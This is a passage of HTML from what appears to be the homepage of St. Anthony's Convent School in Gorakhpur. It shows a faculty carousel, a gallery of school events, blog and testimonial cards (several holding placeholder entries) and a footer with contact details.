                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mr. Amit Rathi</h5>
                                <p class="mb-1 text-muted">B.Tech, M.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Python &amp; Web Development</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mr. Deepak Joshi</h5>
                                <p class="mb-1 text-muted">M.Sc, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Botany &amp; Zoology</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mr. Nitin Deshmukh</h5>
                                <p class="mb-1 text-muted">M.Sc, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Organic &amp; Inorganic Chemistry</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mr. Rajesh Sharma</h5>
                                <p class="mb-1 text-muted">M.Sc, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Physics &amp; Chemistry</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mr. Sandeep Yadav</h5>
                                <p class="mb-1 text-muted">B.P.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Fitness &amp; Sports</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mrs. Anjali Verma</h5>
                                <p class="mb-1 text-muted">M.Sc, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Algebra &amp; Trigonometry</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mrs. Priya Kapoor</h5>
                                <p class="mb-1 text-muted">M.A, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> History &amp; Civics</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mrs. Rekha Sinha</h5>
                                <p class="mb-1 text-muted">B.F.A, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Sketching &amp; Painting</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Mrs. Sunita Mehra</h5>
                                <p class="mb-1 text-muted">M.A, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Grammar &amp; Literature</p>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 bg-white border rounded shadow-sm text-center h-100 d-flex flex-column">
                                <div class="rts__author--img mb-3">
                                    <img src="upload/teacher/621754675468.webp" alt="Teacher" class="rounded-circle" width="100" height="100" style="object-fit: cover;">
                                </div>
                                <h5 class="mb-1">Ms. Kavita Jain</h5>
                                <p class="mb-1 text-muted">M.A, B.Ed</p>
                                <p class="mb-1"><strong>Expertise:</strong> Literature &amp; Poetry</p>
                            </div>
                        </div>
                                            </div>
                    <div class="rts__pagination v__1 mt-4 text-center"></div>
                </div>
                            </div>
        </div>
    </div>
</section>

<!-- ============================================================================ -->
<!-- CAMPUS LIFE / GALLERY -->
<!-- ============================================================================ -->
<section class="campus rts__primary__bg-2 rts-section-padding">
    <div class="container">
        <div class="row">
            <div class="rts__section--wrapper v__6">
                <h2 class="rts__section--wrapper--title">Our School Life</h2>
            </div>
        </div>

        <div class="row g-5">
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=17">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1754328238_DSC_0236.JPG" alt="Our School">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=17">
                            Our School 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=18">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1754328253_DSC_0075.JPG" alt="Events">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=18">
                            Events 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=21">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1755251217_IMG-20250815-WA0011.jpg" alt="Independence Day ">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=21">
                            Independence Day  
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=23">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1756966918_DSC_0339.JPG" alt="Teacher Day">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=23">
                            Teacher Day 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=24">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1763956175_DSC_0676.JPG" alt="KG Day Celebration">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=24">
                            KG Day Celebration 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=26">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1765341881_DSC_1041.JPG" alt="Seminar for the parents of primary students.">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=26">
                            Seminar for the parents of primary students. 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=27">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1765342056_DSC_1099.JPG" alt="Book Fair">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=27">
                            Book Fair 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=29">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1767776503_20251220_112504.jpg" alt="Talento Exhibition">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=29">
                            Talento Exhibition 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=30">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1769149693_WhatsApp Image 2026-01-23 at 11.55.36 AM.jpeg" alt="ALUMNI MEET 2026">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=30">
                            ALUMNI MEET 2026 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=31">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1777462725_WhatsApp Image 2026-04-27 at 1.12.25 AM (1).jpeg" alt="Earth Day Celebration">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=31">
                            Earth Day Celebration 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=32">
                        <div class="campus__single--item--thumb">
                            <img src="upload/category/1777624696_DSC_0554.JPG" alt="Vidyaarambh 2026-27">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=32">
                            Vidyaarambh 2026-27 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                        <div class="col-lg-3 col-md-6 col-sm-6">
                <div class="campus__single--item">
                    <a href="gallery_view.php?category_id=34">
                        <div class="campus__single--item--thumb">
                            <img src="assets/images/campus/default.jpg" alt="YELLOW DAY">
                        </div>
                    </a>
                    <h5 class="campus__single--item--title">
                        <a href="gallery_view.php?category_id=34">
                            YELLOW DAY 
                            <span><i class="fa-light fa-arrow-right"></i></span>
                        </a>
                    </h5>
                </div>
            </div>
                    </div>
    </div>

    <div class="rts__shape">
        <img src="assets/images/icon/note_khata.svg" class="rts__shape--1" alt="">
        <img src="assets/images/icon/book.svg" class="rts__shape--2" alt="">
        <img src="assets/images/icon/compas_scale.svg" class="rts__shape--3" alt="">
    </div>
</section>

<!-- ============================================================================ -->
<!-- BLOG SECTION -->
<!-- ============================================================================ -->
<section class="feedback rts-section-padding">
    <div class="container">
        <div class="row">
            <div class="col-sm-12 text-center">
                <div class="rts__section--wrapper v__9">
                    <h2 class="rts__section--title">Our Blog</h2>
                    <p class="rts__section--description">You'll find something to spark your curiosity and enhance</p>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-lg-12">
                                <div class="rts__testimonial--active swiper swiper-data" data-swiper='{
                    "slidesPerView": 3,
                    "loop": true,
                    "speed": 800,
                    "pagination": {"el": ".rts__pagination","clickable": true},
                    "autoplay": {"delay": 5000},
                    "breakpoints": {
                        "320": { "slidesPerView": 1 },
                        "576": { "slidesPerView": 1.5 },
                        "768": { "slidesPerView": 2 },
                        "992": { "slidesPerView": 3 },
                        "1200": { "slidesPerView": 4 }
                    }
                }'>
                    <div class="swiper-wrapper">
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="assets/images/default-blog.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">t2</h5>
                                <p class="text-muted small">t2...</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> t2</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2026</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="assets/images/default-blog.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">v3</h5>
                                <p class="text-muted small">v3...</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> v3</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2026</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="assets/images/default-blog.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">v3</h5>
                                <p class="text-muted small">v3...</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> v3</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2026</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="assets/images/default-blog.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">v3</h5>
                                <p class="text-muted small">v3...</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> v3</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2026</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="assets/images/default-blog.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">vht</h5>
                                <p class="text-muted small">vht...</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> vht</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2026</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172233.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Welcome to St. Anthony’s Convent School</h5>
                                <p class="text-muted small">An introduction to the values and vision of St. Anthony’s Convent School....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Our School History</h5>
                                <p class="text-muted small">St. Anthony’s Convent School has a rich legacy of educational excellence since its inception....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Academic Programs at St. Anthony’s</h5>
                                <p class="text-muted small">A detailed look at the academic curriculum and co-curricular activities offered at our school....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Celebrating Annual Day 2025</h5>
                                <p class="text-muted small">A grand celebration of our Annual Day with performances, awards, and more....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Importance of Moral Education</h5>
                                <p class="text-muted small">At St. Anthony’s, we emphasize character building through moral education....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Meet Our Faculty</h5>
                                <p class="text-muted small">Our team of experienced, passionate educators who nurture every child....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Infrastructure and Facilities</h5>
                                <p class="text-muted small">A tour of our state-of-the-art facilities including smart classrooms, labs, and library....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Admission Process 2025-2026</h5>
                                <p class="text-muted small">Everything you need to know about enrolling your child at St. Anthony’s Convent School....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="upload/blog/blog-2025-08-08-172249.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Student Achievements</h5>
                                <p class="text-muted small">Celebrating the success stories of our talented students in academics and sports....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial blog-card p-3 border bg-white shadow-sm rounded h-100 d-flex flex-column">
                                <div class="rts__author--img mb-2">
                                    <img src="assets/images/default-blog.jpg" alt="Blog Image" class="rounded" style="height:200px; width:100%; object-fit:cover;">
                                </div>
                                <h5 class="mb-2 text-dark">Parent-Teacher Collaboration</h5>
                                <p class="text-muted small">We believe in building strong partnerships between parents and teachers....</p>
                                <div class="d-flex justify-content-between align-items-center mt-2">
                                    <span class="small"><i class="fa fa-user"></i> Admin</span>
                                    <span class="small"><i class="fa fa-calendar"></i> Aug 08, 2025</span>
                                </div>
                            </div>
                        </div>
                                            </div>
                    <div class="rts__pagination v__1 mt-4 text-center"></div>
                </div>
                            </div>
        </div>
    </div>
</section>

<!-- ============================================================================ -->
<!-- TESTIMONIALS SECTION -->
<!-- ============================================================================ -->
<section class="feedback rts-section-padding">
    <div class="container"> 
        <div class="row">
            <div class="col-sm-12">
                <div class="rts__section--wrapper v__9 text-center">
                    <h2 class="rts__section--title">Testimonials</h2>
                    <p class="rts__section--description">You'll find something to spark your curiosity and enhance</p>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-lg-12">
                                <div class="rts__testimonial--active swiper swiper-data" data-swiper='{
                    "slidesPerView":2,
                    "loop": true,
                    "speed": 1000,
                    "pagination":{"el":".rts__pagination","clickable": true},
                    "autoplay":{"delay": 6000},
                    "breakpoints":{
                        "320":{"slidesPerView": 1},
                        "576":{"slidesPerView": 1.5},
                        "768":{"slidesPerView": 2},
                        "992":{"slidesPerView": 2},
                        "1200":{"slidesPerView": 2}
                    }
                }'>
                    <div class="swiper-wrapper">
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 border shadow-sm rounded bg-white h-100">
                                <div class="rts__rating--star mb-2 text-warning">
                                                                                                                        <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-regular fa-star"></i>
                                                                                                                                                                <i class="fa-regular fa-star"></i>
                                                                                                            </div>

                                <p class="rts__single--testimonial--text text-muted small" style="min-height: 80px;">
                                    &quot;We are extremely happy with  School. The teachers are dedicated, and the curriculum is well-structured. Our child ...                                </p>

                                <div class="rts__single--testimonial--author mt-3 d-flex align-items-center justify-content-between">
                                    <div class="d-flex align-items-center">
                                        <div class="rts__author--img me-3">
                                            <img src="https://via.placeholder.com/60" alt="author" class="rounded-circle" width="60" height="60" style="object-fit: cover;">
                                        </div>
                                        <div class="rts__author--info">
                                            <h6 class="mb-0">a3</h6>
                                            <span class="designation small text-muted">Student</span>
                                        </div>
                                    </div>
                                    <div class="rts__single--testimonial--quote">
                                        <img src="assets/images/testimonial/quote.svg" alt="quote" width="20">
                                    </div>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 border shadow-sm rounded bg-white h-100">
                                <div class="rts__rating--star mb-2 text-warning">
                                                                                                                        <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-regular fa-star"></i>
                                                                                                                                                                <i class="fa-regular fa-star"></i>
                                                                                                            </div>

                                <p class="rts__single--testimonial--text text-muted small" style="min-height: 80px;">
                                    &quot;We are extremely happy with School. The teachers are dedicated, and the curriculum is well-structured. Our child h...                                </p>

                                <div class="rts__single--testimonial--author mt-3 d-flex align-items-center justify-content-between">
                                    <div class="d-flex align-items-center">
                                        <div class="rts__author--img me-3">
                                            <img src="https://via.placeholder.com/60" alt="author" class="rounded-circle" width="60" height="60" style="object-fit: cover;">
                                        </div>
                                        <div class="rts__author--info">
                                            <h6 class="mb-0">a2</h6>
                                            <span class="designation small text-muted">Student</span>
                                        </div>
                                    </div>
                                    <div class="rts__single--testimonial--quote">
                                        <img src="assets/images/testimonial/quote.svg" alt="quote" width="20">
                                    </div>
                                </div>
                            </div>
                        </div>
                                                <div class="swiper-slide">
                            <div class="rts__single--testimonial p-3 border shadow-sm rounded bg-white h-100">
                                <div class="rts__rating--star mb-2 text-warning">
                                                                                                                        <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-solid fa-star"></i>
                                                                                                                                                                <i class="fa-regular fa-star"></i>
                                                                                                                                                                <i class="fa-regular fa-star"></i>
                                                                                                            </div>

                                <p class="rts__single--testimonial--text text-muted small" style="min-height: 80px;">
                                    &quot;We are extremely happy with School. The teachers are dedicated, and the curriculum is well-structured. Our child h...                                </p>

                                <div class="rts__single--testimonial--author mt-3 d-flex align-items-center justify-content-between">
                                    <div class="d-flex align-items-center">
                                        <div class="rts__author--img me-3">
                                            <img src="https://via.placeholder.com/60" alt="author" class="rounded-circle" width="60" height="60" style="object-fit: cover;">
                                        </div>
                                        <div class="rts__author--info">
                                            <h6 class="mb-0">A1</h6>
                                            <span class="designation small text-muted">Student</span>
                                        </div>
                                    </div>
                                    <div class="rts__single--testimonial--quote">
                                        <img src="assets/images/testimonial/quote.svg" alt="quote" width="20">
                                    </div>
                                </div>
                            </div>
                        </div>
                                            </div>
                    <div class="rts__pagination v__1 mt-4 text-center"></div>
                </div>
                            </div>
        </div>
    </div>
</section>



<!-- footer start -->
    <footer class="rts-footer rts-footer-padding v_2">
        <div class="container">
            <div class="row justify-content-center">
                <div class="rts-footer-newsletter">
                    <div class="col-lg-10">
                        <div class="rts-newsletter-box-content">
                            <h4 class="newsletter-title">Subscribe To Newsletter
                            </h4>
                            <div class="newsletter-form w-530">
                                <form action="#">
                                    <input type="email" name="subscription" id="subscription" placeholder="Enter Your mail" required="">
                                    <button type="submit" class="rts-nbg-btn btn-arrow">Subscribe <span><i class="fa-sharp fa-regular fa-arrow-right"></i></span></button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row gy-5 gy-lg-0">
                <div class="col-lg-4 col-md-6 col-sm-6">
                    <div class="rts-footer-widget w-320">
                        <div class="header__logo" style="display: flex; align-items: center;">
                            <a href="index.php" style="display: flex; align-items: center; text-decoration: none;">
                                <img src="assets/images/logo/emblem 1.png"
                                    alt="St. Anthony’s Convent School Logo"
                                    height="80" width="80"
                                    style="border-radius: 50%; object-fit: cover; margin-right: 10px; border: 2px solid #ccc;">
                                
                                <div style="color: #000;">
                                    <h5 style="margin: 0; font-weight: bold; font-size: 18px; line-height: 1.2;color:white">
                                        St. Anthony’s Convent School
                                    </h5>
                                    <small style="font-size: 13px; color: #6c757d;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>


                        <p>
                            We are passionate education dedicated to providing high-quality
                            resources learners all backgrounds.
                        </p>
                        <div class="rts-contact-link">
                            <a href="mailto:stanthony100@gmail.com"><i class="fa-sharp fa-light fa-location-dot"></i> Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                            <a href="callto:0551-228 0250"><i class="fa-thin fa-phone"></i> 0551-228 0250</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-6">
                    <div class="rts-footer-widget ">
                        <h6 class="rt-semi">Important Links</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Privacy Policy</a></li>
                                <li><a href="#">Terms & Conditions</a></li>
                                <li><a href="#">Sitemap</a></li>
                                <li><a href="#"> Blogs</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-4">
                    <div class="rts-footer-widget ml--30">
                        <h6 class="rt-semi">About Us</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Our History </a></li>
                                <li><a href="About.php">About Us</a></li>
                                <li><a href="#">St. Anthony</a></li>
                                <li><a href="#">Our Mission</a></li>
                                <li><a href="#">Our Vision</a></li>
                                 <li><a href="#">Our Motto</a></li>
                                <li><a href="#">School Anthem</a></li>
                               
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 col-sm-8">
                    <div class="rts-footer-widget ml--30">
                        
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <div class="rts-footer-copy-right v_1">
        <div class="container">
            <div class="row">
                <div class="rt-center">
